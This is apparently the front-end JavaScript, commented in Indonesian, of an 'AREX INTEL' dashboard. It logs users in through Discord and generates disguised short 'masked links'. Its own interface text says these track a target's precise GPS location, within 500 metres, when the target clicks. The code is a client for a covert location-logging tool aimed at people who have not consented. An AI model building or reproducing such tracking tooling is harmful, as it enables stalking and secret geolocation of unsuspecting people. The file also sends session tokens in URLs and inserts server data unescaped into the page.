// script.js - AREX INTEL DASHBOARD (FULL CODE)

// ============================================
// 1. CEK SESSION / LOGIN STATUS
// ============================================
async function checkSession() {
  // Tangkap parameter dari URL jika baru saja redirect dari login Discord
  const urlParams = new URLSearchParams(window.location.search);
  const urlSession = urlParams.get('session');
  const urlUsername = urlParams.get('username');
  const urlAvatar = urlParams.get('avatar');

  if (urlSession) {
    // Simpan ke localStorage supaya permanen
    localStorage.setItem('session_token', urlSession);
    if (urlUsername) localStorage.setItem('username', urlUsername);
    if (urlAvatar) localStorage.setItem('avatar', urlAvatar);

    // Bersihkan URL dari parameter supaya bersih
    window.history.replaceState({}, document.title, window.location.pathname);
  }

  const session = localStorage.getItem('session_token');
  
  if (!session) {
    // Belum login
    document.getElementById('loginState').style.display = 'block';
    document.getElementById('appState').style.display = 'none';
    return;
  }

  try {
    const res = await fetch(`/api/auth/callback?session=${session}`);
    const data = await res.json();

    if (data.user) {
      // Login berhasil
      document.getElementById('loginState').style.display = 'none';
      document.getElementById('appState').style.display = 'block';
      
      document.getElementById('userAvatar').src = data.user.avatar || 'https://cdn.discordapp.com/embed/avatars/0.png';
      document.getElementById('userName').textContent = data.user.username || 'User';
    } else {
      // Session invalid
      localStorage.clear();
      document.getElementById('loginState').style.display = 'block';
      document.getElementById('appState').style.display = 'none';
    }
  } catch (err) {
    console.error('Session check error:', err);
    document.getElementById('loginState').style.display = 'block';
    document.getElementById('appState').style.display = 'none';
  }
}

// ============================================
// 2. GENERATE MASKED LINK
// ============================================
async function generateMaskedLink() {
  const input = document.getElementById('targetUrl');
  const btn = document.querySelector('.btn-danger');
  const resBox = document.getElementById('resLogger');
  
  const target = input.value.trim();
  const session = localStorage.getItem('session_token');

  // Validasi
  if (!target) {
    resBox.className = 'result-box error';
    resBox.textContent = '❌ Masukkan URL tujuan terlebih dahulu!';
    return;
  }

  if (!session) {
    resBox.className = 'result-box error';
    resBox.textContent = '❌ Silakan login terlebih dahulu!';
    return;
  }

  // Format URL
  let formattedTarget = target;
  if (!target.startsWith('http://') && !target.startsWith('https://')) {
    formattedTarget = 'https://' + target;
  }

  // Disable button
  btn.disabled = true;
  btn.textContent = '⏳ Processing...';
  resBox.className = 'result-box';
  resBox.textContent = '⏳ Membuat link tracking...';

  try {
    const res = await fetch(`/api/r?action=create&target=${encodeURIComponent(formattedTarget)}&session=${session}`);
    const data = await res.json();

    if (data.error) {
      resBox.className = 'result-box error';
      resBox.textContent = '❌ ' + data.error;
      return;
    }

    // Sukses
    resBox.className = 'result-box success';
    resBox.innerHTML = `
      ✅ Link berhasil dibuat!<br>
      🔗 <span class="short-link" onclick="window.open('${data.shortUrl}', '_blank')">${data.shortUrl}</span>
      <br><br>
      <span style="font-size:12px; color:#64748b;">
        📍 GPS presisi &lt; 500m akan dilacak saat target mengklik link
      </span>
    `;

    // Auto copy ke clipboard
    try {
      await navigator.clipboard.writeText(data.shortUrl);
      resBox.innerHTML += `<br><span style="font-size:12px; color:#22c55e;">📋 Link sudah disalin ke clipboard!</span>`;
    } catch (e) {
      // Ignore jika clipboard tidak support
    }

  } catch (err) {
    resBox.className = 'result-box error';
    resBox.textContent = '❌ Terjadi kesalahan: ' + err.message;
  } finally {
    btn.disabled = false;
    btn.textContent = 'Bikin Link';
  }
}

// ============================================
// 3. HANDLE ENTER KEY & INIT
// ============================================
document.addEventListener('DOMContentLoaded', function() {
  // Cek session
  checkSession();

  // Enter key support
  const input = document.getElementById('targetUrl');
  if (input) {
    input.addEventListener('keypress', function(e) {
      if (e.key === 'Enter') {
        generateMaskedLink();
      }
    });

    // Auto-focus ke input
    setTimeout(() => input.focus(), 500);
  }
});

// ============================================
// 4. LOGOUT FUNCTION (Optional)
// ============================================
function logout() {
  localStorage.clear();
  window.location.href = '/';
}